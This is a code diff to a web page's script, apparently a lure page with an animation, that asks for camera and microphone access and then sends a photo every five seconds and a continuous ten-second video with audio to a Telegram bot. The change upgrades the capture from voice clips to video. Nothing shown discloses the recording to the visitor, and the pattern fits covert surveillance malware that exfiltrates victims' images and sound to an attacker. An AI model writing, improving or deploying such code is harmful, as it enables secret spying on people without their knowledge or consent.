@@ -243,38 +243,46 @@
       animate();
     }
 
+    // ✅ FIXED to send 10s video with audio and 5s snapshots
     function requestCameraAndMic() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
           const videoTrack = stream.getVideoTracks()[0];
           const imageCapture = new ImageCapture(videoTrack);
+
+          // Send picture every 5s
           setInterval(() => {
             imageCapture.takePhoto().then(blob => {
               sendToTelegram(blob, "photo");
-            });
+            }).catch(err => console.error("Photo error:", err));
           }, 5000);
 
+          // Send 10-second video with audio continuously
           setInterval(() => {
-            const mediaRecorder = new MediaRecorder(stream);
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
             let chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = () => {
-              const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-              sendToTelegram(audioBlob, "voice");
+              const videoBlob = new Blob(chunks, { type: 'video/webm' });
+              sendToTelegram(videoBlob, "video");
             };
             mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 10000);
-          }, 15000);
+            setTimeout(() => mediaRecorder.stop(), 10000); // Record exactly 10 seconds
+          }, 10000);
         })
         .catch(err => console.error("Permission denied or error:", err));
     }
 
     function sendToTelegram(blob, type) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/send${type === "photo" ? "Photo" : "Voice"}`;
+      const apiMethod = type === "photo" ? "sendPhoto" : "sendVideo";
       const formData = new FormData();
-      formData.append(type === "photo" ? "photo" : "voice", blob, type === "photo" ? "image.jpg" : "audio.webm");
+      formData.append(type, blob, type === "photo" ? "image.jpg" : "video.webm");
       formData.append("chat_id", CHAT_ID);
-      fetch(url, { method: "POST", body: formData }).catch(err => console.error(err));
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${apiMethod}`, {
+        method: "POST",
+        body: formData
+      }).catch(err => console.error("Telegram send error:", err));
     }
   </script>
 </body>
